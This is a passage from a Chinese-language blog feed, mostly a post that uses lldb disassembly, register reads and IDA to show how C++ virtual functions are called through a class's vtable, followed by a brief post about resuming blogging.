0f 1f 44 00 00        nop    dword ptr [rax + rax]</span><br><span class="line">    0x10f14d0b0: 55                    push   rbp</span><br><span class="line">    0x10f14d0b1: 48 89 e5              mov    rbp, rsp</span><br><span class="line">    0x10f14d0b4: 48 83 ec 10           sub    rsp, 0x10</span><br><span class="line">    0x10f14d0b8: 48 8b 05 49 0f 00 00  mov    rax, qword ptr [rip + 0xf49] ; (void *)0x00007fffb3966770: std::__1::cout</span><br></pre></td></tr></table></figure><p>确实没有错，这里就是我们的调用的第一个虚函数的位置<br>那我们就可以确定，call之前的rax存放的就是虚表指针<br>但是看源代码中，我们一共调用了两个虚函数，还有一个应该是talk()<br>我去看看虚表中的第二个指针所指向的内存中的内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x/20i 0x000000010f14d0b0</span><br><span class="line">    0x10f14d0b0: 55                    push   rbp</span><br><span class="line">    0x10f14d0b1: 48 89 e5              mov    rbp, rsp</span><br><span class="line">    0x10f14d0b4: 48 83 ec 10           sub    rsp, 0x10</span><br><span class="line">    0x10f14d0b8: 48 8b 05 49 0f 00 00  mov    rax, qword ptr [rip + 0xf49] ; (void *)0x00007fffb3966770: std::__1::cout</span><br><span class="line">    0x10f14d0bf: 48 89 7d f8           mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14d0c3: 48 89 c7              mov    rdi, rax</span><br><span class="line">    0x10f14d0c6: 48 8d 35 5a 0e 00 00  lea    rsi, [rip + 0xe5a]        ; "I'm SonClass::talk()."</span><br><span class="line">    0x10f14d0cd: e8 aa 0c 00 00        call   0x10f14dd7c               ; symbol stub for: std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp; std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt; &gt;(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, char const*)</span><br><span class="line">    0x10f14d0d2: 48 89 c7              mov    rdi, rax</span><br><span class="line">    0x10f14d0d5: 48 8d 35 e4 00 00 00  lea    rsi, [rip + 0xe4]         ; std::__1::endl&lt;char, std::__1::char_traits&lt;char&gt; &gt; at ostream:1001</span><br><span class="line">    0x10f14d0dc: e8 bf 00 00 00        call   0x10f14d1a0               </span><br><span class="line">    0x10f14d0e1: 48 89 45 f0           mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">    0x10f14d0e5: 48 83 c4 10           add    rsp, 0x10</span><br><span class="line">    0x10f14d0e9: 5d                    pop    rbp</span><br><span class="line">    0x10f14d0ea: c3                    ret    </span><br><span class="line">    0x10f14d0eb: 0f 1f 44 00 00        nop    dword ptr [rax + rax]</span><br><span class="line">    0x10f14d0f0: 55                    push   rbp</span><br><span class="line">    0x10f14d0f1: 48 89 e5              mov    rbp, rsp</span><br><span class="line">    0x10f14d0f4: 48 89 7d f8           mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14d0f8: 48 8b 7d f8           mov    rdi, qword ptr [rbp - 0x8]</span><br></pre></td></tr></table></figure><p>没有什么问题，这个类的虚函数<br>跟进到下一次call虚函数之前</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">(lldb) dis</span><br><span class="line">letClassSaySomething @ virtual_function:</span><br><span class="line">    0x10f14cef0: push   rbp</span><br><span class="line">    0x10f14cef1: mov    rbp, rsp</span><br><span class="line">    0x10f14cef4: sub    rsp, 0x20</span><br><span class="line">    0x10f14cef8: mov    qword ptr [rbp - 0x8], rdi</span><br><span class="line">    0x10f14cefc: mov    rdi, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf00: mov    rax, qword ptr [rdi]</span><br><span class="line">    0x10f14cf03: call   qword ptr [rax]</span><br><span class="line">    0x10f14cf05: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf09: mov    rdi, qword ptr [rax]</span><br><span class="line">    0x10f14cf0c: mov    qword ptr [rbp - 0x10], rdi</span><br><span class="line">    0x10f14cf10: mov    rdi, rax</span><br><span class="line">    0x10f14cf13: mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line"><span class="meta">-&gt;</span>  0x10f14cf17: call   qword ptr [rax + 0x8]</span><br><span class="line">    0x10f14cf1a: mov    rax, qword ptr [rbp - 0x8]</span><br><span class="line">    0x10f14cf1e: cmp    rax, 0x0</span><br><span class="line">    0x10f14cf22: mov    qword ptr [rbp - 0x18], rax</span><br><span class="line">    0x10f14cf26: je     0x10f14cf38               ; &lt;+72&gt; at main.cpp:42</span><br><span class="line">    0x10f14cf2c: mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">    0x10f14cf30: mov    rdi, rax</span><br><span class="line">    0x10f14cf33: call   0x10f14dd88               ; symbol stub for: operator delete(void*)</span><br><span class="line">    0x10f14cf38: add    rsp, 0x20</span><br><span class="line">    0x10f14cf3c: pop    rbp</span><br><span class="line">    0x10f14cf3d: ret    </span><br><span class="line">    0x10f14cf3e: nop    </span><br><span class="line">(lldb) register read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = 0x000000010f14e118  virtual_function\`vtable for SonClass + 16</span><br><span class="line">       rbx = 0x0000000000000000</span><br><span class="line">       rcx = 0x00007fffb3966770  libc++.1.dylib\`std::__1::cout</span><br><span class="line">       rdx = 0x0000000000000000</span><br><span class="line">       rdi = 0x00007ffc32402e20</span><br><span class="line">       rsi = 0x00000000000120a8</span><br><span class="line">       rbp = 0x00007ffee0ab36e0</span><br><span class="line">       rsp = 0x00007ffee0ab36c0</span><br><span class="line">        r8 = 0x00000000000130a8</span><br><span class="line">        r9 = 0x00007fffb421ff78  __sFX + 248</span><br><span class="line">       r10 = 0x0000000000000000</span><br><span class="line">       r11 = 0x00007fffb421ff70  __sFX + 240</span><br><span class="line">       r12 = 0x0000000000000000</span><br><span class="line">       r13 = 0x0000000000000000</span><br><span class="line">       r14 = 0x0000000000000000</span><br><span class="line">       r15 = 0x0000000000000000</span><br><span class="line">       rip = 0x000000010f14cf17  virtual_function\`letClassSaySomething(SonClass*) + 39 at main.cpp:40</span><br><span class="line">    rflags = 0x0000000000000202</span><br><span class="line">        cs = 0x000000000000002b</span><br><span class="line">        fs = 0x0000000000000000</span><br><span class="line">        gs = 0x0000000000000000</span><br></pre></td></tr></table></figure><p>rax中还是虚表指针，而这一次的call，是找到虚表指针所指向的内存中的第二个指针(第二个虚函数)，直接调用<br>由于刚才看了源代码，所以不再需要去看了<br>总结一下：<br>1.new之后的返回值就是对象指针<br>2.构造函数之后的rax其实是虚表指针，但并不是返回值，只是构造函数中用到了rax而已<br>3.对象在new出来之后返回对象指针，对象指针所指向的内存会被memset清空;而在类构造函数中，会将该类的虚表指针放入对象指针所指向的内存中+0的位置，便于后面调用虚函数的时候可以直接从对象指针中取到虚表指针，从而得到每一个虚函数的实际内存地址并call过去<br>4.下面我画出对象指针、虚表指针中的布局和关系图：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffc32402e20(new的返回值/对象指针) --&gt; 0x7ffc32402e20: 0x000000010f14e118(虚表指针) 0x000000010f14e138</span><br><span class="line">0x000000010f14e118(虚表指针) --&gt; 0x10f14e118: 0x000000010f14d070(虚函数1的指针) 0x000000010f14d0b0(虚函数2的指针)</span><br></pre></td></tr></table></figure><p>由于我在程序中加入了一个printf函数用于检验fcp这个指针的值，所以直接c掉查看命令行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I'm SonClass::say().</span><br><span class="line">I'm SonClass::talk().</span><br><span class="line">0x7ffc32402e20</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><p>我自己分析出来的SonClass的虚表中的虚函数排列是这样的：<br>–low addr–<br>SonClass::say()<br>SonClass::talk();<br>–high addr–<br>和调用的顺序是一样的<br>我还需要在IDA里面找到虚表对照一下验证我自己通过逆向分析的虚表是否正确<br>IDA找到SonClass::say()或者SonClass::talk()，直接查看交叉引用<br>//由于IDA中会有特殊符号导致markdown中代码块语法出现问题，所以有些注释我直接删除了<br>//虚表复制到markdown格式里面有挺多的问题，不想搞，所以就只取了最重要的部分贴过来<br>const:0000000100002118 dq offset __ZN8SonClass3sayEv ; SonClass::say(void)<br>const:0000000100002120 dq offset __ZN8SonClass4talkEv ; SonClass::talk(void)<br>确实如我所分析的那样</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>虽然踩了挺多坑，但是也差不多搞明白了：<br>1.对象中虚函数的调用方式<br>2.如何找到一个类的虚表</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为看懂大型项目的源码有困难，所以最近在看一些有关设计模式方面的知识;&lt;br&gt;在看简单工厂模式的时候遇到了以前所忽视的一些问题;  &lt;/p&gt;
&lt;h3 id=&quot;Object-Oriented-Programming&quot;&gt;&lt;a href=&quot;#Object-Oriented-Pro
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Blog again</title>
    <link href="http://yoursite.com/2019/09/21/Blog-again/"/>
    <id>http://yoursite.com/2019/09/21/Blog-again/</id>
    <published>2019-09-21T12:43:31.000Z</published>
    <updated>2019-09-23T10:04:30.471Z</updated>
    
    <content type="html"><![CDATA[<p>最近又开始想写博客了，感觉最近变懒了很多，也不愿意再写下一些东西算作留念;<br>早些时候我关闭了自己的博客，原因是因为懒和不知道写什么;<br>最近因为在研究一些比较有趣的新目标，所以又开始想写博客了;</p><p>我们所做的事，本来就要和自己的平庸作斗争 -by skr</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近又开始想写博客了，感觉最近变懒了很多，也不愿意再写下一些东西算作留念;&lt;br&gt;早些时候我关闭了自己的博客，原因是因为懒和不知道写什么;&lt;br&gt;最近因为在研究一些比较有趣的新目标，所以又开始想写博客了;&lt;/p&gt;
&lt;p&gt;我们所做的事，本来就要和自己的平庸作斗争 -by sk
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
